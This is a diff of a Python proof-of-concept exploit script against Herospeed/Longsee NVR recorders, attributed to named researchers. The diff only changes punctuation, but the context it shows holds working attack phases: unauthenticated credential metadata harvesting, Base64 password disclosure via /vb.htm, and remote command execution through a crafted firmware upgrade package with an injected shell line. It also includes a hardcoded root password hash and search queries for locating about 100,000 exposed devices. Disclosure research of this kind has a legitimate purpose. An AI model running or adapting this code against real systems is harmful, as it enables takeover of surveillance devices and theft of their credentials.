@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 =============================================================================
-  Herospeed / Longsee NVR — End-to-End Proof of Concept
+  Herospeed / Longsee NVR  -  End-to-End Proof of Concept
   Vulnerability IDs: HSLS-2026-001 through HSLS-2026-004
   Research: André Henrique (@mrhenrike) | Uniao Geek
   Community discovery: c3l3r1on (github.com/c3l3r1on)
@@ -15,13 +15,13 @@ This PoC demonstrates four confirmed vulnerabilities in Herospeed/Longsee
 N-series NVR devices running firmware v2.0.4 (2023) through v2.0.8 (2025):
 
   HSLS-2026-001: Unauthenticated Credential Metadata Disclosure
-                 /api/session/login-capabilities — CVSS 9.1
+                 /api/session/login-capabilities  -  CVSS 9.1
   HSLS-2026-002: XVR Legacy Interface Credential Disclosure (/vb.htm)
-                 /vb.htm?selectalluserlist — CVSS 6.5
+                 /vb.htm?selectalluserlist  -  CVSS 6.5
   HSLS-2026-003: Upgrade Package Shell Execution RCE (update.sh)
-                 v2.0.4: source injection | v2.0.6+: retreat.sh — CVSS 8.8
+                 v2.0.4: source injection | v2.0.6+: retreat.sh  -  CVSS 8.8
   HSLS-2026-004: Hardcoded Root Password Hash (All Versions 2023-2025)
-                 12ZpTwfyH6/Bs — CVSS 9.8
+                 12ZpTwfyH6/Bs  -  CVSS 9.8
 
 Usage:
   # Full chain (all 4 phases):
@@ -49,12 +49,12 @@ except ImportError:
     import hashlib
     import struct
     def _des_crypt(password: str, salt: str) -> str:
-        """Minimal DES crypt(3) — sufficient for hash comparison only."""
+        """Minimal DES crypt(3)  -  sufficient for hash comparison only."""
         try:
             import passlib.hash  # type: ignore
             return passlib.hash.des_crypt.using(salt=salt).hash(password)[:13]
         except ImportError:
-            return "(crypt unavailable — use hashcat -m 1500 to crack)"
+            return "(crypt unavailable  -  use hashcat -m 1500 to crack)"
 import hashlib
 import json
 import re
@@ -97,7 +97,7 @@ def bold(s: str) -> str:
 
 def banner() -> None:
     print(cyan(SEPARATOR))
-    print(cyan("  Herospeed / Longsee NVR — Vulnerability PoC"))
+    print(cyan("  Herospeed / Longsee NVR  -  Vulnerability PoC"))
     print(cyan("  HSLS-2026-001 to HSLS-2026-004"))
     print(cyan("  Research: André Henrique (@mrhenrike) | Uniao Geek"))
     print(cyan("  Community: c3l3r1on (github.com/c3l3r1on)"))
@@ -232,7 +232,7 @@ def _login(host: str, port: int, username: str, password: str) -> str | None:
     return None
 
 
-# ─── Phase 1: HSLS-2026-001 — Unauth Credential Metadata ─────────────────────
+# ─── Phase 1: HSLS-2026-001  -  Unauth Credential Metadata ─────────────────────
 
 def phase1_unauth_credential_metadata(host: str, port: int) -> dict:
     log_phase(1, "Unauthenticated Credential Metadata Disclosure", "HSLS-2026-001")
@@ -254,7 +254,7 @@ def phase1_unauth_credential_metadata(host: str, port: int) -> dict:
         session_id = d.get("sessionID", "")
         enc_types = d.get("encryptionType", [])
         if salt or session_id:
-            log_ok(f"Username '{username}' exists — metadata disclosed without authentication:")
+            log_ok(f"Username '{username}' exists  -  metadata disclosed without authentication:")
             log_evidence("  salt", salt)
             log_evidence("  challenge", challenge)
             log_evidence("  iterations", str(iterations))
@@ -265,14 +265,14 @@ def phase1_unauth_credential_metadata(host: str, port: int) -> dict:
     if results:
         log_ok(f"CONFIRMED: {len(results)} accounts have credential metadata exposed without authentication.")
         log_warn("Impact: Enables offline SHA-256 KDF brute-force without triggering any lockout.")
-        log_warn("CVSS: 9.1 CRITICAL — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N")
+        log_warn("CVSS: 9.1 CRITICAL  -  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N")
     else:
         log_fail("No credential metadata returned (may not be a Herospeed/Longsee NVR).")
 
     return results
 
 
-# ─── Phase 2: HSLS-2026-002 — XVR /vb.htm Credential Disclosure ──────────────
+# ─── Phase 2: HSLS-2026-002  -  XVR /vb.htm Credential Disclosure ──────────────
 
 def phase2_vbhtm_credential_disclosure(host: str, port: int) -> dict:
     log_phase(2, "XVR Legacy Interface Credential Disclosure (/vb.htm)", "HSLS-2026-002")
@@ -337,18 +337,18 @@ def phase2_vbhtm_credential_disclosure(host: str, port: int) -> dict:
 
     if results:
         log_warn("CONFIRMED: Passwords returned as Base64 (plaintext-equivalent).")
-        log_warn("CVSS: 6.5 MEDIUM — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N")
+        log_warn("CVSS: 6.5 MEDIUM  -  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N")
     return results
 
 
-# ─── Phase 3: HSLS-2026-003 — Upgrade Shell Execution RCE ───────────────────
+# ─── Phase 3: HSLS-2026-003  -  Upgrade Shell Execution RCE ───────────────────
 
 def phase3_upgrade_rce(host: str, port: int, username: str, password: str, cmd: str) -> bool:
     log_phase(3, "Upgrade Package Shell Execution RCE", "HSLS-2026-003")
     log_info(f"Target: POST http://{host}:{port}/api/upgrade/upgrade-file")
     log_info(f"Credentials: {username}:{password}")
     log_info(f"Command to inject: {cmd}")
-    log_warn("This phase modifies device state — use only on devices you own.")
+    log_warn("This phase modifies device state  -  use only on devices you own.")
 
     log_info("Step 1: Authenticating via SHA-256 KDF...")
     cookie = _login(host, port, username, password)
@@ -369,19 +369,19 @@ def phase3_upgrade_rce(host: str, port: int, username: str, password: str, cmd: 
     # Choose payload based on version
     is_v206_or_later = "V2.0.6" in fw_ver or "V2.0.7" in fw_ver or "V2.0.8" in fw_ver
     if is_v206_or_later:
-        log_info("Detected v2.0.6+ — using retreat.sh execution vector (#!/bin/sh shebang)")
+        log_info("Detected v2.0.6+  -  using retreat.sh execution vector (#!/bin/sh shebang)")
         version_content = f"""#!/bin/sh
 # Herospeed NVR v2.0.6 retreat.sh exploit (HSLS-2026-003b)
-# Executed by update.sh retreat mechanism — direct shell execution
+# Executed by update.sh retreat mechanism  -  direct shell execution
 {cmd}
 COREMD5=2843ca1adc0dbb1f91d0d65bd2a1592d
 BASEMD5=66b2b993819be0f8d4912cdfa6eeb6f4
 LOGOMD5=fe15c07c394743315b5064948e35b25e
 UBOOTMD5=b83fd86fe1cbe161066aedd16dbabefe
 """.encode()
-        log_warn("Vector: v2.0.6 'retreat.sh' — update.sh explicitly executes this as a shell script")
+        log_warn("Vector: v2.0.6 'retreat.sh'  -  update.sh explicitly executes this as a shell script")
     else:
-        log_info("Detected v2.0.4 or unknown — using shell source injection vector")
+        log_info("Detected v2.0.4 or unknown  -  using shell source injection vector")
         version_content = f"""DEVICENAME=NVR
 FIRMVERSION=V2.0.4.230818_UPDATE_POC
 {cmd}
@@ -390,7 +390,7 @@ BASEMD5=2d051329fef1b20353297e00d0dbbe04
 LOGOMD5=fe15c07c394743315b5064948e35b25e
 UBOOTMD5=7047bad35aa288f288a00bc846aecbbc
 """.encode()
-        log_warn("Vector: v2.0.4 source injection — update.sh sources version file (shell . operator)")
+        log_warn("Vector: v2.0.4 source injection  -  update.sh sources version file (shell . operator)")
 
     # Build minimal firmware package with malicious version partition
     log_info("Step 3: Crafting firmware package with injected version file...")
@@ -452,7 +452,7 @@ UBOOTMD5=7047bad35aa288f288a00bc846aecbbc
         return False
 
 
-# ─── Phase 4: HSLS-2026-004 — Hardcoded Root Hash ───────────────────────────
+# ─── Phase 4: HSLS-2026-004  -  Hardcoded Root Hash ───────────────────────────
 
 def phase4_hardcoded_root_hash(host: str, port: int) -> bool:
     log_phase(4, "Hardcoded Root Password Hash (Universal 2023-2025)", "HSLS-2026-004")
@@ -552,7 +552,7 @@ EXPOSURE_NOTES = """
 Exposure Estimates (based on c3l3r1on field research + platform fingerprints):
 
   FOFA (confirmed by c3l3r1on, May 2026):
-    body="longseSha256" — approximately 100,000+ exposed devices in Europe
+    body="longseSha256"  -  approximately 100,000+ exposed devices in Europe
     Note: FOFA also includes non-NVR Longsee devices (cameras)
 
   Shodan queries (researcher-constructed, unverified counts):
@@ -574,7 +574,7 @@ Exposure Estimates (based on c3l3r1on field research + platform fingerprints):
 
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="Herospeed/Longsee NVR E2E PoC — HSLS-2026-001 to HSLS-2026-004"
+        description="Herospeed/Longsee NVR E2E PoC  -  HSLS-2026-001 to HSLS-2026-004"
     )
     parser.add_argument("--target", required=True, help="Target IP address")
     parser.add_argument("--port", type=int, default=80, help="HTTP port (default: 80)")
